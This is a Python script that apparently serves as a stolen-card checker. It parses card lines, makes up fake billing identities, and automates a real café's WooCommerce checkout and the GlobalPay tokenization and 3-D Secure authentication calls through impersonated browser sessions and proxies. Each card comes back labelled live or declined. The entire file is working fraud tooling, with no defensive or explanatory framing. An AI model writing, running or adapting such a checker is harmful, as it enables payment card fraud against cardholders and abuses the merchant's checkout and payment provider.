import re
import json
import uuid
from faker import Faker
from curl_cffi.requests import AsyncSession

fake = Faker("en_US")

class tools:
    @staticmethod
    def getcard(card: str) -> dict:
        parts = card.split("|")
        cc = parts[0].strip() if len(parts) > 0 else ""
        mm = parts[1].strip() if len(parts) > 1 else ""
        yy = parts[2].strip() if len(parts) > 2 else ""
        cvv = parts[3].strip() if len(parts) > 3 else ""
        
        mm = mm.zfill(2)
        
        if len(yy) == 2:
            yy = f"20{yy}"
        elif len(yy) == 4:
            yy = yy
            
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}



    @staticmethod
    def find_between(s: str, first: str, last: str) -> str | None:
        try:
            return s.split(first, 1)[1].split(last, 1)[0]
        except (IndexError, AttributeError):
            return None

    @staticmethod
    def userdata() -> dict:
        fn = fake.first_name()
        ln = fake.last_name()
        return {
            "name": f"{fn} {ln}",
            "first": fn,
            "last": ln,
            "address": fake.street_address(),
            "city": fake.city(),
            "state": fake.state_abbr(),
            "zip": fake.postcode(),
            "email": f"{fn.lower()}.{ln.lower()}@gmail.com",
            "phone": fake.phone_number(),
        }

    @staticmethod
    def get_card_type(cc_first: str) -> str:
        if not cc_first:
            return "visa"
        return {"3": "american-express", "5": "master-card", "6": "discover"}.get(cc_first[0], "visa")

RESPONSE_MAP = {
    "success_authenticated": ("Success", "SUCCESS_AUTHENTICATED ✅", True),
    "success_attempt_made": ("Success", "SUCCESS_ATTEMPT ✅", True),
    "failed": ("Declined", "3DS_FAILED ❌", False),
    "challenge_required": ("Challenge", "CHALLENGE_REQUIRED ⚠️", False),
    "not_authenticated": ("Declined", "NOT_AUTHENTICATED ❌", False),
}

class Gateway:
    @staticmethod
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        ref = str(uuid.uuid4())
        ua = fake.user_agent()

        async with AsyncSession(impersonate="chrome139", proxies=proxies) as session:
            try:
                # Step 1: Add product to cart (multipart)
                headers_add = {
                    "origin": "https://halocafe.ie",
                    "referer": "https://halocafe.ie/product/catering/",
                }
                files_add = {
                    "quantity": (None, "1"),
                    "add-to-cart": (None, "325"),
                }
                await session.post(
                    "https://halocafe.ie/product/catering/",
                    headers=headers_add,
                    files=files_add,
                )

                # Step 2: GET checkout page to extract tokens and nonces
                headers_checkout = {
                    "referer": "https://halocafe.ie/cart/",
                }
                resp_checkout = await session.get(
                    "https://halocafe.ie/checkout/",
                    headers=headers_checkout,
                )
                html = resp_checkout.text

                # Extract accessToken
                tok_match = re.search(r'accessToken["\']\s*:\s*["\']([^"\']+)["\']', html)
                if not tok_match:
                    return "Error", "accessToken not found", False
                tok = tok_match.group(1)

                hash_nonce = tools.find_between(html, 'name="woocommerce-process-checkout-nonce" value="', '"')
                upd = tools.find_between(html, '"update_order_review_nonce"\s*:\s*"([^"]+)"', html)
                # We'll extract using regex because find_between with \s may not work; use re
                upd_match = re.search(r'"update_order_review_nonce"\s*:\s*"([^"]+)"', html)
                if not upd_match:
                    return "Error", "update_order_review_nonce not found", False
                upd = upd_match.group(1)

                if not hash_nonce or not upd:
                    return "Error", "Missing checkout nonces", False

                # Step 3: Update order review (AJAX)
                headers_update = {
                    "origin": "https://halocafe.ie",
                    "referer": "https://halocafe.ie/checkout/",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "x-requested-with": "XMLHttpRequest",
                }
                params_update = {"wc-ajax": "update_order_review"}
                current_time = fake.date_time().strftime("%Y-%m-%d %H:%M:%S")  # approximate

                # Build post_data as in original, but we'll use a dictionary to avoid manual string building
                post_data_parts = [
                    ("wc_order_attribution_source_type", "typein"),
                    ("wc_order_attribution_referrer", "(none)"),
                    ("wc_order_attribution_utm_campaign", "(none)"),
                    ("wc_order_attribution_utm_source", "(direct)"),
                    ("wc_order_attribution_utm_medium", "(none)"),
                    ("wc_order_attribution_utm_content", "(none)"),
                    ("wc_order_attribution_utm_id", "(none)"),
                    ("wc_order_attribution_utm_term", "(none)"),
                    ("wc_order_attribution_utm_source_platform", "(none)"),
                    ("wc_order_attribution_utm_creative_format", "(none)"),
                    ("wc_order_attribution_utm_marketing_tactic", "(none)"),
                    ("wc_order_attribution_session_entry", "https://halocafe.ie/checkout/"),
                    ("wc_order_attribution_session_start_time", current_time),
                    ("wc_order_attribution_session_pages", "12"),
                    ("wc_order_attribution_session_count", "1"),
                    ("wc_order_attribution_user_agent", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"),
                    ("billing_first_name", user_data["first"]),
                    ("billing_last_name", user_data["last"]),
                    ("billing_company", user_data["name"]),
                    ("billing_country", "US"),
                    ("billing_address_1", user_data["address"]),
                    ("billing_address_2", ""),
                    ("billing_city", user_data["city"]),
                    ("billing_state", user_data["state"]),
                    ("billing_postcode", user_data["zip"]),
                    ("billing_phone", user_data["phone"]),
                    ("billing_email", user_data["email"]),
                    ("order_comments", ""),
                    ("payment_method", "globalpayments_gpapi"),
                    ("woocommerce-process-checkout-nonce", hash_nonce),
                    ("_wp_http_referer", "/checkout/"),
                ]
                post_data = "&".join(f"{k}={v}" for k, v in post_data_parts)

                data_update = {
                    "security": upd,
                    "payment_method": "globalpayments_gpapi",
                    "country": "US",
                    "state": user_data["state"],
                    "postcode": user_data["zip"],
                    "city": user_data["city"],
                    "address": user_data["address"],
                    "address_2": "",
                    "s_country": "US",
                    "s_state": user_data["state"],
                    "s_postcode": user_data["zip"],
                    "s_city": user_data["city"],
                    "s_address": user_data["address"],
                    "s_address_2": "",
                    "has_full_address": "true",
                    "post_data": post_data,
                }
                await session.post(
                    "https://halocafe.ie/",
                    params=params_update,
                    headers=headers_update,
                    data=data_update,
                )

                # Step 4: GET order info (not used further, but keep)
                headers_order_info = {
                    "referer": "https://halocafe.ie/checkout/",
                    "x-requested-with": "XMLHttpRequest",
                }
                await session.get(
                    "https://halocafe.ie/wc-api/globalpayments_order_info/",
                    headers=headers_order_info,
                )

                # Step 5: Tokenize card via GlobalPay
                headers_token = {
                    "origin": "https://js.globalpay.com",
                    "referer": "https://js.globalpay.com/",
                    "content-type": "application/json",
                    "authorization": f"Bearer {tok}",
                }
                json_token = {
                    "reference": ref,
                    "usage_mode": "SINGLE",
                    "card": {
                        "number": card_data["cc"],
                        "cvv": card_data["cvv"],
                        "expiry_month": card_data["mm"],
                        "expiry_year": card_data["yy"],
                    },
                    "name": user_data["name"],
                }
                resp_token = await session.post(
                    "https://apis.globalpay.com/ucp/payment-methods",
                    headers=headers_token,
                    json=json_token,
                )
                token_json = resp_token.json()
                payment_id = token_json.get("id")
                merchant_id = token_json.get("merchant_id")
                if not payment_id or not merchant_id:
                    return "Error", "Failed to get payment method ID or merchant ID", False

                # Step 6: Check enrollment (3DS)
                headers_enroll = {
                    "origin": "https://halocafe.ie",
                    "referer": "https://halocafe.ie/checkout/",
                    "content-type": "application/json",
                }
                json_enroll = {
                    "tokenResponse": f'{{"details":{{"accountId":"TKA_853beda80ac84f728550e70e9e6211a0","accountName":"tokenization","merchantId":"{merchant_id}","merchantName":"Halo Cafe","reference":"{ref}","cardholderName":"{user_data['name']}"}},"paymentReference":"{payment_id}"}}',
                    "order": {
                        "id": 0,
                        "amount": "4.00",
                        "currency": "EUR",
                    },
                }
                resp_enroll = await session.post(
                    "https://halocafe.ie/wc-api/globalpayments_threedsecure_checkenrollment/",
                    headers=headers_enroll,
                    json=json_enroll,
                )
                enroll_json = resp_enroll.json()
                server_transaction_id = enroll_json.get("serverTransactionId")
                if not server_transaction_id:
                    return "Error", "serverTransactionId not found", False

                # Step 7: Initiate authentication (3DS)
                headers_auth = {
                    "origin": "https://halocafe.ie",
                    "referer": "https://halocafe.ie/checkout/",
                    "content-type": "application/json",
                }
                json_auth = {
                    "tokenResponse": f'{{"details":{{"accountId":"TKA_853beda80ac84f728550e70e9e6211a0","accountName":"tokenization","merchantId":"{merchant_id}","merchantName":"Halo Cafe","reference":"{ref}","cardholderName":"{user_data['name']}"}},"paymentReference":"{payment_id}"}}',
                    "versionCheckData": {
                        "enrolled": "ENROLLED",
                        "version": "TWO",
                        "status": "AVAILABLE",
                        "liabilityShift": None,
                        "serverTransactionId": server_transaction_id,
                        "sessionDataFieldName": "threeDSSessionData",
                        "methodUrl": None,
                        "methodData": None,
                        "messageType": "creq",
                    },
                    "challengeWindow": {
                        "windowSize": "WINDOWED_500X600",
                        "displayMode": "lightbox",
                    },
                    "order": {
                        "id": 0,
                        "amount": "4.00",
                        "currency": "EUR",
                        "billingAddress": {
                            "streetAddress1": user_data["address"],
                            "streetAddress2": "",
                            "city": user_data["city"],
                            "state": user_data["state"],
                            "postalCode": user_data["zip"],
                            "country": "US",
                        },
                        "shippingAddress": {
                            "streetAddress1": user_data["address"],
                            "streetAddress2": "",
                            "city": user_data["city"],
                            "state": user_data["state"],
                            "postalCode": user_data["zip"],
                            "country": "US",
                        },
                        "addressMatchIndicator": True,
                        "customerEmail": user_data["email"],
                    },
                    "authenticationSource": "BROWSER",
                    "authenticationRequestType": "PAYMENT_TRANSACTION",
                    "messageCategory": "PAYMENT_AUTHENTICATION",
                    "challengeRequestIndicator": "NO_PREFERENCE",
                    "browserData": {
                        "colorDepth": "TWENTY_FOUR_BITS",
                        "javaEnabled": False,
                        "javascriptEnabled": True,
                        "language": "ar-IQ",
                        "screenHeight": 813,
                        "screenWidth": 370,
                        "time": fake.date_time().isoformat(),
                        "timezoneOffset": -3,
                        "userAgent": ua,
                    },
                }
                resp_auth = await session.post(
                    "https://halocafe.ie/wc-api/globalpayments_threedsecure_initiateauthentication/",
                    headers=headers_auth,
                    json=json_auth,
                )
                response_text = resp_auth.text.lower()

                # Step 8: Classify using RESPONSE_MAP
                for key, (status, msg, is_live) in RESPONSE_MAP.items():
                    if key in response_text:
                        return status, msg, is_live

                return "Unknown", "Unrecognised response ❓", False

            except Exception as e:
                return "Error", f"Exception: {str(e)}", False


async def process_GP_1_passed(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
    card_data = tools.getcard(card_line)
    if not card_data["cc"]:
        return "Failed", "Invalid card format", False

    user_data = tools.userdata()
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

    return await Gateway.charge_card(
        card_data=card_data,
        user_data=user_data,
        proxies=proxies,
    )